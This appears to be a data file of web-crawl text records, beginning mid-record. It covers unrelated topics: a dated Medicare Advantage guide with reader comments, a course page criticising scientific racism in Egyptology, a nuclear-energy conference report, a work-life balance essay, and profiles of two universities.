it's important to shop around for the best plan for you.\nPart C plans may offer extra coverage, such as vision, hearing, dental, and/or health and wellness programs. Most include Medicare prescription drug coverage, sometimes at an extra cost.\nPPO Advantage Plans are another type \u2013 These plans are fairly predictable making them quite popular among seniors on Medicare. you've got a huge network of doctors and hospitals to choose from with a PPO, but using an out-of-network provider is an option for a specific service, it will be at a much higher price. With a PPO plan referrals are not needed and you can see as many different doctors as you'd like. You can get a PPO with Part D prescription coverage included or without the coverage.\nAll the benefits of Medicare Part A, including hospital stays, skilled nursing care and home health care, but not hospice care. However, because you must be enrolled in Part A to get a Medicare Advantage plans 2013 or if you're still on a 2012 plan, your Part A benefit helps cover hospice care \u2013 See AARPHealthCare.\nAll the benefits of Part B, including doctor visits, outpatient care, screenings, shots and lab tests.\nPrescription drugs, if Medicare Part D prescription drug coverage is included in the Medicare Advantage plan (many do include this coverage).\nSome Medicare Advantage plans may also include coverage for extra services such as a fitness benefit or hearing and vision care.\nGetting a Medicare PPO plan may be ideal for you and your family/spouse if you are okay with the network size, but prefer to have the flexibility to see multiple doctors and visit different hospitals for treatment.\nAnthem Plans \u2013 Anthem is one of the most popular options.\nCigna advantage plans \u2013 Not one of the most popular choices but still great for certain people.\nAdvantage kaiser plans \u2013 The differences with Kaiser senior advantage and how it all works.\nIf your living in a large area a Medicare HMO plan may just be the ideal policy to get your insurance coverage, since its networks are often comprehensive and cost sharing is relatively low \u2013 If you are living in California then another terrific provider is Western Health Advantage but see our 'about us' page on them, they offer some of the best plans in the industry. On the other hand, if you live in an area with a pretty small network or you travel extensively, a PPO plan might be the right choice.\nMedicare PFFS Plans \u2013 At first glance, PFFS plans give you a great deal of flexibility and independence, but getting covered services can often be unpredictable. You are not required to use a network and can choose your own providers, but the plan decides how much they will pay doctors and hospitals and how much you will pay for services. This said, you can go to any Medicare approved doctor or hospital if they agree to treat you. Not all providers will accept the plan's payment terms or agree to treat you. In fact, they can decide to treat you on a visit by visit basis, except in the case of an emergency.\nRead our guide about Medicare advantage dis-enrollment periods.\nYou can join a Medicare Advantage program as soon as you become eligible for Medicare, or during your initial enrollment period. You'll also need to enroll in Part A and Part B at this time.\nOnce you've joined Medicare Part A and Part B, you can't be refused coverage by any plans in your area that are accepting new members. However, special rules apply to people with end-stage renal disease.\nIn some rural areas, PFFS plans may be your only choice (though your choices are fewer in 2011) because credible networks are difficult to put together by Advantage Plan carriers. Because of legislation to be effective in 2011, many carriers have ceased to offer PFFS plans in certain areas.\nThis legislation requires PFFS plan sponsors to offer a provider network to members in service areas where two or more network plans already exist. Assembling a credible network in less populated areas is more of a challenge than some plan sponsors are willing to under take. This has resulted in less Medicare Advantage options in those service areas.\nMedicare MSA Plans \u2013 They are no where near as popular as any of the other advantage plans, MSA Plans are made up of two very different components/parts; a bank/savings account and a deductible (one that is relatively high). It works like this: Medicare gives over a lump sum of money to the policy and a portion of it is deposited into the bank account. You will have a ton of out-of pocket expenses since the sum that was deposited into your account is much less then the deductible. Your plan will cover everything for the year once the deductible is met. Any money that is left in the account can be used for your next year. Your MSA plan will not include prescription drug coverage, you are going to have to look into medicare part d plans for that. One of the pros to this sort of plan is that you will not need a referral to see a specialist or any kind of doctor in the network.\nChoose a MSA Plan if you are extremely healthy and can cover the out-of-pocket expenses.\nMedicare SNP Plans \u2013 Only a limited a very specific group of seniors can get access this type of medicare policy. For it to be the right fit, you are going to have to be dual enrolled with Original Medicare plus Medicaid, or if you have some sort of part in a certain type of institution, sort of like a nursing home, having a chronic health condition like heart failure or requiring bull-time nursing care at your own home, diabetes, HIV/Aids, among others. Medicare Part D will be included in any plan you enroll in and you will need a refferal to see a specialist and it will have to be one that is within the network (except for emergency and certain types of preventative care).\nConsider a SNP if you meet the criteria for enrollment, as these plans are designed to best meet your needs by offering a higher degree of coordinated care and case management.\nUnderstanding the different types of plans available and how they relate to your circumstances can go a long way towards a fulfilling experience in your Advantage Plan membership and usage.\nMedicare Part C is an alternative to Parts A and B, delivered through a private managed care plan, such as an HMO. Also called Medicare Advantage, Part C combines Part A and Part B in one plan. If you enroll in a Medicare Part C plan, you don't separately use or pay for Medicare Parts A or B. People enroll with Part C Medicare because it may cost slightly less than care with traditional Medicare Parts A and B, and because it sometimes offers a few minor extra services. Some Part C plans also have drug coverage (with one of these, there's no need for a Part D plan). Part C plans limit the choice of healthcare providers from whom you get your care.\nAre there limits to Medicare advantage coverage for 2013?\nCoverage limits vary by plan, so you'll have to look at the specific 2013 Medicare Advantage plan's details to see if there are any coverage limits or exclusions.\nMedigap vs Medicare advantage \u2013 the differences between the two.\nReplacement plans with Medicare \u2013 policies that can replace Original Medicare.\nAdvantage enrollment \u2013 The best times of the year to enroll in a plan.\nPart of the Balanced Budget Act of 1997, the Medicare Advantage Plan allows Medicare beneficiaries to receive their benefitsthrough private health insurance plans, as opposed to the original Medicare Plans (Parts A & B). Medicare Advantage allows beneficiaries the option of receiving insurance through the private plan of their choice. While these plans are often limited to a specific network of doctors, most companies allow you to pay an additional fee to see a doctor outside of the specified network. This allows beneficiaries to receive the care they want from the doctors they want and still receive their Medicare benefits, albeit in a different way.\nThe Medicare Advantage Plans of 2013 will also allow for a little more flexibility than traditional Medicare does. Medicare Advantage includes prescription drug coverage, and beneficiaries can choose these plans that include dental and vision care as well as health club or gym memberships. Medicare Advantage places a heavy emphasis on preventive care. These benefits come with the condition that you must stay in-network for your care, but many beneficiaries find this trade-off more than reasonable. Overall, those who decide to participate in these sort of policies generally do so because they see Part C as a better value than traditional Medicare.\nBut Advantage Plans are not perfect. Many people who were originally enrolled in Medicare Advantage for 2012 and now 2013 have since switched back to traditional Medicare. The most common complaint of former Advantage Plan holders was that the quality of Medicare was less than satisfactory, although, this is rapidly changing and it just might be right for 2013 depending on where your area. If you think that Medicare Advantage sounds like the right plan for you, be sure to talk it over with your healthcare provider and, if you can, an insurance professional to make sure that you understand the differences between traditional Medicare and Medicare Advantage and the effects that each plan will have on your healthcare.\nI am the manager of outpatient admissions for a rehabilitation hospital (physical therapy \u2013 not drug rehab), and my best advice to anyone considering switching to a Medicare Advantage Plan is to really do the research and know what you are buying before you get locked in. We have many, many patients who have Medicare Advantage Plans and have been referred to us for physical therapy or cardiac rehab, and their policies require a large copay per visit. I've seen everything from $15 per visit copays to $150 per visit. The most common copay amounts for outpatient therapy are $25 and $50 per visit. Most patients are prescribed physical therapy two or three times per week for three to four weeks. Can you afford to pay $75 per week in copays for physical therapy \u2013 every week for four weeks? A cardiac rehab program is three times per week x 12 weeks (36 visits). At $25 per week, that's $900 in copays. I am a manager working 40 hours per week and I wouldn't be able to afford that myself! Please be careful!\nSharon, I am especially glad that you posted all that information about the co-pays that you have experienced in the physical therapy profession, that is a bit of information that would normally get skipped over by the insurance company. From what I gather there are quite a few plans to choose from, anywhere from Plan A to Plan F I think. I will bring this up to my insurance company and see what they say. Thank you again for the useful information.\nHow much is Medicare going up?\nTHANKS FOR THE INFO. WELL HELPOFUL.

{"text": "Unit 1: Class 6: The Whitening of Ancient Kemet/Egypt\nEgyptology and Scientific Racism cont.\nDr. Cheikh Anta Diop (Dec. 29, 1923 \u2013 7 Feb. 1986) was a Senegalese historian, anthropologist, physicist, and a politician who studied the human race's origins and pre-colonial African culture. He successfully proved that the ancient Egyptians were Black Africans.\nIn addition to using skulls, monuments, and Biblical tales to counter Herodotus' claims of a black Egyptian civilization, Morton argued that the eyewitness account of Ptolemy, published in the 2nd century, A.C.E., was far more reliable. More than 500 years after Herodotus, Ptolemy recorded geographical accounts of the Egyptian population. For Morton, the demographics were \"ample evidence\" of a non-Black origin. It was appalling for an educated scholar to suggest that the people of Egypt remained virtually the same over a period of 500 years or more. Just as the U.S. population in 2014 does not reflect the nation's demographics in 1514, the people who occupied Egypt after periods of foreign invasion and decline were not the same people who built the ancient Egyptian civilization.\nMorton was not alone in his determination to establish Egypt as a Caucasian civilization. In 1851, Irish writer John Campbell dismissed African origins of Ancient Egypt in his book, Negro-mania: Being an Examination of the Falsely Assumed Equality of the Various Races of Men. He explained:\nThere is one great difficulty, and to my mind an insurmountable one, which is that the advocates of the Negro civilization of Egypt do not attempt to account for, how this civilization was lost. We know that the white never loses, but always gains. A nation or tribe of the white race may become extinct, from a variety of causes, but the civilization of the race progresses notwithstanding. Egypt progressed, and why, because it was Caucasian.\nThe study of ancient Egypt is inherently a study of how Western scholars have used race to control how we understand the past\u2014and present. Despite the absurdity of Morton's many theories, he was widely respected and his racist ideas had a lasting impact on science, history, and politics. These racist theories by leading scholars were used to justify slavery, colonialism, and other forms of oppression.\nEgyptology and Eugenics\nScientific racism continued to undergird Egyptology over the course of the nineteenth century. British archeologist W. M. Flinders Petrie, a pioneer in the field, led some of the most significant excavations in the Nile Valley region in the 1880s and 1890s. His discoveries were groundbreaking in terms of recovering ancient Egyptian knowledge, culture, and architecture. In fact, W.E.B. DuBois believed Petrie's findings supported a Black origin of Egyptian civilization, and he invited Petrie to serve as a board member for a major project to produce an encyclopedia of African history. Yet, Petrie's interpretations of ancient Egyptian history differed from DuBois' views in significant ways. Petrie was less explicit in his belief in white racial superiority, but he continued the work of earlier scientists through careful classification of the Ancient Egyptians into different races or \"types,\" which perpetuated a hierarchy of humankind and a non-African origin of Egyptian civilization.\nAccording to Petrie, the depictions of ancient Egyptians inside of tombs indicated the presence of at least three races: \"an acquiline race\" with a slender nose, a \"snouty race typical of the lower classes,\" and a \"large eyed race,\" all of which demonstrated to Petrie that the Ancient Egyptians were not descendants of a single source in Africa. Rather, Petrie suggested the Egyptians were conquered by an \"invading race\u2026a high class race\" that migrated to Egypt from the Red Sea. Similar to Morton's theories, Petrie described the Egyptians as \"a kindred race to the Phoenicians\" and claimed the invading \"Dynastic race\" was responsible for Egypt's unparalleled achievements.\nFree E-Books!\nThe African Origins of Civilization: Myth or Reality by Cheikh Anta Diop\u200b\nStolen Legacy,\nby George G.M.

{"text": "Conference: Nuclear gains ground in political debate\n9 October 2018\t| World Nuclear News\nRussian Energy Week, a Moscow-based annual conference and exhibition traditionally devoted to hydrocarbons, has for the second time included a session about the nuclear power industry. Claire-Louise Isted, editor of World Nuclear News, reports here on the increasing prominence of the world's best hope against climate change.\nRussian state nuclear corporation Rosatom's own annual event, Atomexpo, also draws thousands of participants fr om across the world. They are already knowledgeable about nuclear power of course and it's anyone's guess how many of the 6000 attending Russian Energy Week are, but the title of last year's session - The role and prospects of nuclear energy development in the global energy mix - was an indicator of the 'newcomer' status awarded to nuclear power - in spite of its 60-year history.\nThis year's panel discussion, which was held on 3 October, had a more promising title: Atomic energy - the foundation of global partnership and modern development and was moderated by World Nuclear Association Director General Agneta Rising. The panel members were: Mikhail Chudakov, deputy director general and head of the Department of Nuclear Energy at the International Atomic Energy Agency (IAEA); Alexey Likhachov, CEO of Rosatom; Pekka Lundmark, president and CEO of Fortum Corporation; Yafes Osman, Bangladesh's minister of science and technology; Nenad Popovi\u0107, Serbia's minister without portfolio responsible for innovation and technological development; and Peter Szijjarto, Hungary's minister of foreign affairs and trade.\nThe fact government ministries and state-owned companies made up the panel, and that the nuclear industry's Harmony goal of adding 1000 GW of new capacity by 2050 had captured their imaginations, showed how this clean, reliable and affordable energy source is securing its place in the political debate on climate change and energy demand. Later the same day, Russian President Vladimir Putin made clear references to the role of nuclear power in the global energy mix during the plenary he hosted titled Sustainable energy for a changing world, the panel members of which were drawn however fr om the oil and gas sectors only. Russia is the world's leading natural gas producer and its second largest oil producer. It is also the world's fourth biggest nuclear power producer (after the USA, France and China).\nRising told World Nuclear News: \"It's encouraging to have such a high-level international panel on new nuclear deployment at a general energy forum mainly focused on oil and gas. This is the second year that nuclear power has been on the programme, but it is more prominent this time.\"\nIn her opening remarks to delegates at the nuclear power session, Rising described the \"two essential requirements\" for the world's future energy system: \"It must provide enough energy to meet global development needs and it must do so in a way that does not harm the planet\".\nThe Paris Agreement on climate change, which entered into force in November 2016, had heralded a shift to clean energy, including nuclear power, she noted.\n\"Currently, nuclear energy provides around 10.5% of the world's electricity from power plants with a combined capacity of 400 GW. The nuclear industry has set a target for nuclear energy to provide 25% of global electricity demand by 2050, which would require the construction of 1000 GW of new nuclear capacity. Achieving this target is a necessary component of a sustainable energy system,\" she said.\nThis target requires the rate of new build to treble. \"This is practical, this is achievable, and the industry has proven that we can do this,\" she said. \"In the mid-1980s we delivered 30 GW in one year. Over a period of ten to 20 years, we were delivering 20 GW per year. We need to go back to that construction model in order to deliver what is so important for the world - 1000 GW by 2050. We need to establish a level playing field, but we must also have harmonised regulatory processes, we need to be able to timely license new designs of reactors, and we also need to create an effective safety paradigm.\"\nLikhachov described 20-25 GW per year as a \"concrete rate\" for new build. \"We are doing all we can to help achieve that 1000 GW by 2050,\" he said, but then stressed the international character of the nuclear industry.\n\"We work on profoundly integrated international projects and not a single nuclear unit we build is 100% Russian - it may be that the turbines, for example, are French, so our approach is developed collectively, and our workforce includes personnel from other countries. Rosatom's openness and transparency guarantees that all of our projects are based on the best technologies, the best professionals and the best competences.\"\nRosatom's sodium-cooled fast reactor, or MBIR, project is \"an excellent example\", he said, \"of how people are coming together to start working on a Generation IV reactor\".\n\"Cooperation between the various players in the nuclear industry isn't a dream but a fact of life today and we are proud of that, proud that countries believe in us,\" he said.\nRenewables need nuclear\nRising asked Chudakov how he sees the role of nuclear energy in achieving the United Nations goals for sustainable development and also as a solution to climate change.\nThe IAEA has noted, he said, that around 70% of the world's electricity is currently produced through the burning of fossil fuels. To meet climate goals by 2050, 80% of electricity will need to be from low-carbon sources.\n\"No single source of energy can do it without nuclear,\" he said. \"It's clear that renewable energy can't do it by itself and will be self-limited to a share of up to 40% [of the global energy mix] by 2050. Also, renewable energy is not dispatchable; it needs back up and this must be done by nuclear power.\"\nThe IAEA's latest forecast for new nuclear capacity shows that by 2050 there will not be the 1000 GW required, but about 700 GW, he said.\n\"The main obstacles to nuclear are not technical, but political. This is about public acceptance, stakeholder involvement, investment, government support - these are the main obstacles and we are working on them. We must educate the public and cause a paradigm shift from public acceptance of nuclear power to public demand for it.\"\nThe IAEA plans to hold its first international conference on climate change in October next year, he noted. \"We must use every stage to highlight that without nuclear we cannot fulfil our obligations on climate change and sustainable development.\"\nTurning to the topic of newcomer countries, Rising asked Osman how Bangladesh is working to build nuclear power into its energy infrastructure.\n\"Bangladesh is suffering because of climate change and without electricity you cannot change the life of the people. We need electricity but at the same time without disturbing the climate. That is our philosophy and our goal and that is why we are going for nuclear power,\" he said.\nPolitical will to have nuclear power in Bangladesh is \"not new\", he added, since this ambition dates back to 1962, before its secession as a separate country from Pakistan.\n\"We are a small country with so many people to feed and our policy is that nuclear power is one of the options; we want at least 10% of our energy to come from nuclear,\" he said.\nRosatom is building two VVER-1200 units at Rooppur, which is 160 km from Dhaka. The project is \"another cornerstone\", Osman said, in the longstanding friendly relations between Russia and Bangladesh. Rooppur 1 is scheduled to begin operation in 2023, with Rooppur 2 following in 2024.\nThe contract is worth USD12.65 billion, including the first few years' fuel. Russia in 2016 agreed to provide an USD11.38 billion credit facility for 90% of the project, with Bangladesh to meet the remainder of the project costs from state-funded grants.\nThe Rooppur project would not have been possible without funding from Rosatom, Osman said, but Bangladesh's introduction of nuclear power to its energy mix will serve as a reference point.\nAsked about newcomer countries like Bangladesh, Chudakov said: \"We have 30 countries operating 454 reactors and about the same number of countries, if not more, that have declared an interest in having nuclear in their energy mix. These countries are at different stages; those that are already constructing nuclear power plants, like Bangladesh, the United Arab Emirates and Belarus, and several that have just started, like Turkey, or are going to start, like Egypt. There are others, in Africa and Asia, and we are helping them to create the necessary infrastructure in order to operate nuclear power plants safely for centuries to come.\"\nThe work involved in establishing the infrastructure needed to support a nuclear power programme is challenging, he said, and some countries have therefore extended the time they believe they will need to do this. These extensions are among the reasons why the agency has seen a decrease in its forecast for new nuclear capacity, he added.\nSzijjarto described Hungary's project to add new units at the site of the existing Paks nuclear power plant, known as Paks II, as essential to national sovereignty.\n\"We really consider it to be an obligation of a state, of a government, to ensure the sovereignty of the given country and one of the most important factors for sovereignty is energy security; that the energy supply of a given country must be stable, predictable, safe and cheap,\" he said. \"If you put the question, what's the cheapest, safest and cleanest way of generating energy, the answer is obvious - it's nuclear power.\"\nThanks to its 36-year history of nuclear power, \"Hungary is able to say that nuclear is the right choice\", he said. \"Nuclear power covers half of Hungary's electricity demand and, by the end of 2030, that share will have risen to 90%,\" he added.\nThe Paks plant, which is 100 km south of Budapest, currently comprises four Russian-supplied VVER-440 pressurised water reactors, which started up between 1982 and 1987. These units have regulatory approval to operate for a further 20 years, meaning they will be phased out during the 2030s.\nRussia and Hungary signed an inter-governmental agreement in early 2014 for Russian enterprises and their international sub-contractors to supply two VVER-1200 reactors at Paks, including a Russian state loan to finance 80% of the project.\nThe debate about nuclear power in general is \"full of hypocrisy and double standards\", Szijjarto said. \"Supporting anti-nuclear is part of political correctness, but we have to stick to our approach that no one should put pressure on us or any other country in putting together its own energy mix,\" he said, referring to Austria's court case against the European Commission for its approval of the Paks II project. Similar opposition to approval of EDF Energy's project to build a nuclear power plant at Hinkley Point in England failed, he noted.\nThe Paks II project could help \"re-establish pragmatic cooperation between East and West\", he suggested. \"Rosatom is the general contractor, but Western European companies and North American companies are being involved as sub-contractors. Although we understand there is a verbal fight when it comes to the EU and Russia at the political level, when you look under the surface you see huge business being made between Western European companies and Russia. So, there's hypocrisy and double standards.\"\nHe noted the agreement also includes a clause that 40% of the work must be done by local companies, which is a big boost for the Hungarian national economy, he said, and it helps stimulate research and development into nuclear power.\nBusiness and climate change\nLundmark said climate change isn't only a political concern, but a commercial one too.\n\"I'm not a politician, I'm a businessperson and I'm extremely worried about climate change and the environment. We have the 2-degrees Paris target, but recent data show that we are heading for a 3-degrees and potentially a 4- to 6-degrees scenario.\" Nuclear power is \"an absolutely key part of the solution\" to climate change, he said.\n\"The European Union has the target to reduce its emissions by 40% by 2030 and if we take the Paris target of 2 degrees, then the European emission reduction should be 95% by 2050. But this is not only about electricity because of European final energy consumption only 20% is electricity today and 50% goes to industrial and residential heating and 30% goes to traffic. If we want to reach the climate goal then all these sectors must be tackled, which means that the industrial processes at large will also need to be electrified in the future.\n\"This means the 2020s will be the decade of electricity. Electricity demand will increase, we will replace processes that are currently fossil-based with electricity and that electricity needs to be CO2 free. We all know that wind and solar are attracting a lot of investment and that's a very good thing, we are very much involved, and we want to maximise our CO2-free production. According to Bloomberg New Energy Finance, maybe 50% of the global power mix in 2050 will be solar and wind, but if we want to decarbonise the other 50% then we are really going to need a lot of nuclear because there is not enough hydro in the world.\n\"If we want to achieve 1000 GW of new nuclear capacity, which I think is an excellent target, then the nuclear industry needs to renew itself. We must develop and become more efficient as an industry; we can't afford extremely long projects with significant cost overruns \u2026 There have been other industries that have been able to create scalable mass markets with serial production of equipment.\n\"We need harmonisation of safety requirements internationally. I have full understanding of the problems for the reactor vendors when they have to adapt their rector design for the requirements of each and every country separately. It's like Boeing having to build different aircraft for different countries - imagine how complicated and difficult that would be. Nobody wants to compromise on safety, but we need international coordination.\"\nNuclear power must be more affordable if the industry wants to compete with other sources of electricity, he said. \"The cost of wind and solar has dropped significantly. I want to believe that there will be ways to significantly decrease the cost of nuclear as well through serial production. We are heavily involved in research projects on small modular reactors, wh ere modules could be factory built with passive safety features and then sent to the site to be quickly installed and which could run there and then be taken back to the factory when their lifetime is over.\n\"So, these types of things, both on the safety side and on the international standardisation side, and normal industrial processes creating serial production for the key components, would be what we as an industry would need to do if we want to win back the trust of the politicians and of the general public in order to be able to meet the 1000 GW target,\" he said.\nPosiva, which is jointly-owned by Fortum and TVO, is working to address another issue that affects public acceptance of nuclear power - the management of waste, Lundmark said.\nIn December 2016, Posiva began construction on a 6500-tonne final waste repository, the world's first permanent underground nuclear waste storage facility, on Olkiluoto island, in Finland. The final disposal facility will consist of an above-ground encapsulation plant, wh ere used fuel will be dried and packed into final disposal canisters made of copper and cast-iron, and a repository consisting of a network of tunnels deep inside the bedrock.\nRising asked him about partnerships in the industry, noting that 'mankala' - the ownership model for energy producers which is unique to the Finnish energy markets - is unusual in the nuclear power industry.\nLundmark said: \"Partnerships are absolutely necessary. When we talk about nuclear, Fortum is directly or indirectly involved in all Nordic reactors - both those in operation and those under construction or at the planning stage. This is a capital-intensive industry. Typically, our main role is to bring the operational competence and industrial expertise. Sometimes we participate with a very large share of the capital, of the equity, and sometimes we have a minor share and sometimes nothing at all and we have a service provider role to other investors in projects. We need to develop all kinds of models.\"\nAlthough he understands the comments Szijjarto made about the Paks II project being important for national energy security and sovereignty, Lundmark said \"climate change doesn't respect national borders\".\n\"If every country was to make all its decisions just inside their country and wants to decarbonise their energy system and build big peak capacity only for the needs of that country, then we end up with an extremely expensive system and the question is can it be decarbonised, can climate change be mitigated. That's why international cooperation partnerships will, I think, be very important in the future.\"\nOne example in the power sector, he said, is building interconnectors between countries.\nRevisiting nuclear\nReferring to Nikola Tesla, the Serbia-born inventor and the founder of the Tesla Electric Company in New York, Rising described Serbia as \"the country that first gave electricity to the world, but which has not yet made a decision about their energy portfolio\". Serbia has nevertheless \"considerable experience in the application of nuclear technologies\", she added.\nPopovi\u0107 said Serbia is also proud of another of its late physicists, Pavle Savi\u0107, whose work with Ir\u00e8ne Joliot-Curie and Fr\u00e9d\u00e9ric Joliot-Curie on research into the action of neutrons on the heavy elements was an important step in the discovery of nuclear fission.\nYugoslavia had plans to build four nuclear power plants, of which two would be in Serbia, but in 1989 it imposed a moratorium against this, which led to the loss of many of its engineers and scientists to countries with nuclear power, Popovi\u0107 noted.\nPopovi\u0107 and Likhachov signed an intergovernmental agreement on cooperation in innovation and technological development of nuclear energy for peaceful purposes during the Atomexpo conference held earlier this year in Sochi, Russia.\nPopovi\u0107 said this was \"a big step in the right direction\", adding that \"in the interim\", several research projects had been conducted with Cern, the European Organisation for Nuclear Research, in Switzerland.\n\"In the two months of working with Rosatom, I've received hundreds of calls from academics who are willing to get back into nuclear research. And the public is interested too,\" he said.", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 85219}

{"text": "Whether you call it work life balance, work life blend, or just maintaining your sanity, we all seem to be in search of that elusive point in life when it seems that our work, relationships, and personal well being are in harmony. If this article were a commercial, this would be the point at which soothing music would begin, and some really happy-looking people would begin appearing on your screen. And then someone would promise to deliver what every other thing you have tried has failed to do... bring you a greater sense of balance.\nDon't get me wrong. There are any number of products and services that do help us bring more order and sanity to our break neck schedules and execution of our work and life priorities. I just think we put an enormous amount of negative pressure on ourselves when we examine our schedules and don't see a \"balanced\" mixture of work and life.\nWhen it is temporary. Depending on the activity, temporary could be 15 minutes or one year. The thought here is that you have a clearly defined ending point when you will be no longer be so consumed by this area of your work or life. Retail store managers and employees will certainly experience a lack of balance in their lives until the end of December and will neglect other areas of their lives. They know that come January, however, their lives will return to some sense of normalcy. My friend Chad is a plant controller, and the first 3-4 days of each month he does what is called \"period close.\" I don't dare call him during those few days because I know he is up to his eyeballs in numbers. His workflow adjusts after a few days. Instead of wringing your hands about the hours that a current work assignment is taking, take comfort in the fact that it will end, and make plans now on how you will replenish those areas of life you have been neglecting.\nWhen you have been fully engaged with other areas you will now neglect for awhile. As I write this article, I am on a 5 day business trip. I miss my family already, and feel a twinge of guilt because I won't be there to experience life with them this week. However, I am just coming off a weekend where I spent all of it fully focused on them, and I am already set to be with them all day on Saturday. The mistake I find many people make is that they don't take care of the right things at the right moment, and they spend so much time regretting that they didn't make better choices when they had the chance.\nWhen you are experiencing a breakthrough. Call it being in the zone or in the flow, there are times when ideas start coming, and we need to stay the course to make sure we don't lose them. I typically write first thing in the morning. When I get a new idea rolling around in my head, I can't just stop and come back later. I may have to miss a breakfast with my family, get to work a little later, or forego exercise in order to finish the thought.\nWhen you know you'll regret it later. As my dad's health failed in his last year of life, the time I had to devote to his care was significant. My business suffered, and time with my own family was sometimes limited. I knew, however, that not taking the chance to honor and care for my dad in this way would haunt me forever. I also knew it was temporary. The choice to take a challenging work assignment or pursue a higher degree will no doubt impede on time on family and personal time, but when will it not do that?\nWhen it's the chance of a lifetime. Rebecca Jones, an extremely talented videographer who is also a friend of mine, once had the chance to intern with Ken Burns. It required a move to the Northeast and very little financial reward, but what an amazing opportunity to work with someone who is the icon in producing documentary films.\nIf you go back and review the reasons that it's okay to have a lack of balance, you probably recognize that your life is probably going to be out of balance more often than it is in balance. That was the premise behind the book, Juggling Elephants, I co-authored with Todd Musig. In it, we equate the struggle of balancing work and life to a circus with 3 rings. In a circus, there is rarely the same level of activity in all 3 rings (balance). One moment one ring is bursting with activity while the other two are less busy, and then a few minutes later another ring becomes the focal point while another may go dark (unbalanced). At the end of the circus performance, however, there will have been a balance of acts in all 3 rings.\nIn the same way, giving ourselves permission to more fully focus on one area of our work or life when it meets the criteria above is a better approach to achieving success in all of them.\nWhat criteria do you use to allow a lack of balance in your life?", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 20206}
{"text": "HomeUniversitiesUnited KingdomUniversity of Leicester\nRankings:\n235 QS World University Rankings 2015\n167 THE World University Rankings 2015-2016\nAbout University of Leicester\nWe think a university should be about empowering people to explore; through passionate, dedicated teaching and innovative, world-changing research. By embracing the fact that every journey is personal, the University has achieved some remarkable results. At Leicester we think that high quality research and excellent teaching are not only complementary, they're inseparable. We are constantly finding new ways of being a leading university, and have done so since we were founded as a University College in 1921.\nThe very compact campus contains a wide range of twentieth century architecture, though the oldest building, the Fielding Johnson building, dates from 1837. The central building, now known as the Fielding Johnson Building and housing the University's administration offices and Faculty of Law and was formerly the Leicestershire and Rutland Lunatic Asylum. Opposite the Fielding Johnson Building are the Astley Clarke Building, home to the School of Economics, and the University Sports Centre.\nThe skyline of Leicester University is punctuated by three distinctive, towering, buildings from the 1960s: the Department of Engineering, the Attenborough tower and the Charles Wilson building. The University's Engineering Building was the first major building by important British architect James Sterling. It comprises workshops and laboratories at ground level, and a tower containing offices and lecture theatres. It was completed in 1963 and is notable for the way in which its external form reflects its internal functions.\nThe 18-storey Attenborough Tower, home to the College of Social Sciences houses the tallest working paternoster in the UK. The Ken Edwards building, built in 1995, lies adjacent to the Fielding Johnson Building and is home to the School of Management. Built in 1957, the Percy Gee building is home to Leicester University's students' union. The David Wilson Library was opened by Queen Elizabeth II in December 2008, following an extensive refurbishment.\nThe main campus is a mile south of the city centre, adjacent to Victoria Park and Wyggeston and Queen Elizabeth I College.\nOadby Student Village\nSet in a residential location, adjacent to the Botanic Garden and University Sports Facilities, the Oadby Student Village is one of the most impressive student accommodation sites in the UK.

{"text": "Central Washington University, or CWU, is a regional, comprehensive public university located on a 380-acre campus in Ellensburg in the US state of Washington. Founded in 1891, the university consists of three chief divisions include the Office of the President, Business and Financial Affairs, and Academic and Student Life (ASL). Within ASL are four colleges: the College of Arts and Humanities, the College of Business (Ellensburg campus and centers in the Puget Sound and central regions), the College of Education and Professional Studies, and College of the Sciences.\nCWU is located about 110 miles (180 km) east of Seattle, Washington on Interstate 90 in the Kittitas Valley. In addition to being the fastest growing public university in the state of Washington, CWU is considered an emerging Hispanic-Serving Institution with 15 percent Hispanic students.\nIn 1890, the state Legislature established the Washington State Normal School (WSNS) in Ellensburg for \"the training and education of teachers in the art of instructing and governing in the public schools of this state.\"  WSNS originally opened on September 6, 1891, with classes held at the Washington Public School in Ellensburg. In 1893, the school's first building was constructed and named Barge Hall, in honor of the first WSNS principal, Benjamin Franklin Barge. Barge Hall was added to the National Register of Historic Places in 1976.\nIn subsequent years, the university constructed additional campus buildings to accommodate a growing student body including: Kamola Hall (1911); Smyser Hall (1925); Munson Hall (1926); Sue Lombard Hall (1926); and McConnell Auditorium (1935). While Barge Hall's architecture reflected a Richardson Romanesque style, the designs of later buildings incorporated elements of proto-Modernism along with Spanish Colonial Revival, Neo-Classical and Classical Revival styles. In the late 20th and early 21st centuries, as academic programs expanded, CWU saw construction of the Science Building I (1997); Black Hall (1998); the Student Union and Recreation Center (2006); Jerrilyn McIntire Music Education Facility (2007); Wendell Hill Hall and Mechanical Building (2008), Barto Hall (2012), Science Building II (2016), and the Samuelson STEM Center (2018).\nIn 1937, the Washington Legislature authorized a name change to Central Washington College of Education. Reflecting the fact that the curriculum had expanded into areas of study in addition to teacher education, the school's name was changed to Central Washington State College in 1961. It became Central Washington University in 1977.\nThe on-campus location is established by a small residence hall, surrounded by the Student Union and Recreation Center and humanity facilities. The STEM and teaching facilities are located near the administrative buildings, which include Black Hall, Bouillon Hall, and the Science Building near Dean Hall (see map on right).\nBarge Hall and Mitchell Hall are where the primary administrative faculty are located. Admissions, Running Start, a Cashiers Office, the Registrar, and financial aid are all located in this area. This region is bounded by Samuelson Hall and living spaces Kamola Hall and Sue Lombard Hall.\nIn addition to the residential campus in Ellensburg, Central Washington University has multiple locations around the state of Washington.\nThe Pacific Northwest Geodetic Array (PANGA) uses real-time GPS measurements to research and measure crustal deformation and mitigate natural hazards throughout the Pacific Northwest. These hazards arise from earthquakes, volcanic eruptions, landslides, and coastal sea-level encroachment. In addition, PANGA GPS measurements are used to monitor man-made structures such as Seattle's sagging Alaska Way Viaduct, 520 and I-90 floating bridges and power-generation / drinking-supply dams throughout the Cascadia subduction zone, including the mega-dams along the Columbia River. GPS data are telemetered in real-time back to CWU, where they are processed in real-time using both JPL's RTG software as well as Trimble's RTKNet Integrity Manager software to provide relative positioning of several mm resolution.\nWine Quality Research Initiative has identified the nature of wine faults in some wines and how to prevent them.

